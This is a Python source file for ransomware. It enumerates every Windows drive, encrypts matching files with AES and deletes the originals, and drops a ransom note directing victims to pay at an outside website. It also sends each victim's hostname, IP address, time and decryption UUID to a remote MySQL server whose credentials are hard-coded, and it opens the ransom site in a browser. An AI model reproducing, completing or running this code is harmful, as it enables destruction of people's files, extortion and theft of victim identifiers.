from Crypto.Cipher import AES
import os, random
from Crypto.Hash import SHA256
from fnmatch import fnmatch
from threading import Thread
import time
from threading import Timer
import sys
#from tkinter import *
from os import remove
from sys import argv
# from decrypt1 import *
import webbrowser
# from sleep import sleep
import win32api
import subprocess
import uuid
import socket
import mysql.connector
#import vss


url = 'http://menace4you.weebly.com'
# directory = 'C:/'
password = "hello123"
location = " "
count = 0
# abc=drives()
# print(abc)
# directory=abc

# THIS WILL TARGET ALL THE FILES THAT END WITH THE FOLLOWING EXTENSIONS
pattern = ["*.cpp"]

pattern1 = ["*.txt",
            "*.docx",
            "*.jpg",
            "*.jpeg",
            "*.pdf",
            "*.exe",
            "*.mp3",
            "*.mp4",
            "*.avi",
            "*.wmv",
            "*.mov",
            "*.csv",
            "*.xlsx",
            "*.pptx",
            "*.py",
            "*.png",
            "*.bmp",
            "*.cpp",
            "*.java",
            "*.jar",
            "*.xml"]


def ltime():
    localtime = (str(time.strftime("%d/%m/%Y"))+" : "+str(time.strftime("%H:%M:%S")))
    return localtime

def uuid1():
    a = uuid.uuid4()
    return a.__str__()


def drives():
    str1 = []
    str = []
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    for x in drives:
        str1 += [x]
        y = x[:1]
        # print(y)
        z = y + ":/"
        str += [z]
    return str


# print("all modules imported")
def encrypt(key, filename):
    IV = " "
    outfile = "encrypted" + filename
    chunksize = 64 * 1024
    filesize = str(os.path.getsize(filename)).zfill(16)
    for i in range(0, 15):
        IV += chr(random.randint(0, 9))
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    with open(filename, 'rb')as infile:
        with open(outfile, 'wb') as outfile:
            outfile.write(bytes(filesize, 'utf-8'))
            outfile.write(bytes(IV, 'utf-8'))

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += (' ' * (16 - (len(chunk) % 16))).encode('ascii')

                outfile.write(encryptor.encrypt(chunk))
            infile.close()
            outfile.close()
            os.remove(filename)


#import socket
#import sys

def connect():
    try:
        REMOTE_SERVER = "www.google.com"
        host=socket.gethostbyname(REMOTE_SERVER)
        s=socket.create_connection((host,80),2)
        return True
    except:
        pass
    return False



def getkey(password):
    a = password.encode('utf-8')
    hasher = SHA256.new(a)
    return hasher.digest()


def ecall(password ,str):
    a = []
    # password=uuid1()
    # ecall.root = str(input("enter the location where you want to encrypt : "))
    print("\nYOYR FILES ARE BEING LOCKED\n")
    instructions = open("Instrcutions.txt", "a")
    instructions.write("The following files have been locked, please pay ransom to get your unlocking password. Please Proceed to http://menace4you.weebly.com ")
    for direct in str:
        root = str
        print(root)
        for path, subdirs, files in os.walk(root):
            # print(files)
            for name in files:
                # print(name)
                for x in range(len(pattern)):
                    if fnmatch(name, pattern[x]):
                        print(name)
                        instructions.write(name)
                        a += [os.path.join(path, name)]

    # gui()
    s = len(a)
    for i in range(0, s):
        m, n = os.path.split(a[i])
        os.chdir(m)
        try:
            encrypt(getkey(password), n)
        except:
            pass

    print("\n\nYOUR FILES HAVE BEEN LOCKED")


def initial():
    password = 'hello123'
    url = 'http://menace4you.weebly.com'

def insert(name ,ip ,uuid ,time ,status="no"):

    db = mysql.connector.connect(user="b08a6132c3ba56", password="344292f1", host="au-cdbr-sl-syd-01.cleardb.net",
                                 database="ibmx_8cdd8c9126b89e9")
    cursor = db.cursor()

    sql = "insert into certdb values ('" + name + "','" + ip + "','" + uuid + "','" + time + "','" + status +"')"
    try:
        # Execute the SQL command

        cursor.execute(sql)
        db.commit()
        print("DONEEE")

    except:
        print("Error")
    db.close


def gui(count):
    time.sleep(5.0)
    w = ""
    abc = 1
    if count <= 2:
        webbrowser.open_new(url)
        count += 1
        abc = count
        if (w == "00"):
            # dcall()
            sys.exit()
        else:
            gui(abc)
    else:
        pass


def timer():
    for x in range(30, 0):
        time.sleep(1)
        print(x)


def delcall():
    # remove(argv[0])
    1 + 1


def info():
    a = socket.gethostname()
    hostname = socket.gethostname()
    IP = socket.gethostbyname(hostname)
    return a, IP


def main1():
    # y=30
    initial()
    a = connect()
    if a is True:
        pass
        print("true")
    else:
        pass
        #sys.exit()

    abc = drives()
    name, ip = info()
    time = ltime()
    uuid = uuid1()
    print(uuid)
    status="no"
    try:
        insert(name, ip, uuid, time, status)
    except:
        print("data was not stored")

    for u in abc:
        try:
            print("\n\n", u, "\n\n")
            ecall(uuid, u)
        except FileNotFoundError:
            print("lol bro")
            # delcall()
            # main2()
    #vss.test()
    #vss.vss()



if __name__ == "__main__":
    main1()

'''
    Thread(target=ecall).start()
    Thread(target=gui(1)).start()
    Thread(target=timer()).start()
    T = Timer(60, dcall)
    T.start()
    sys.exit()



if __name__ == "__main__":
    main()
'''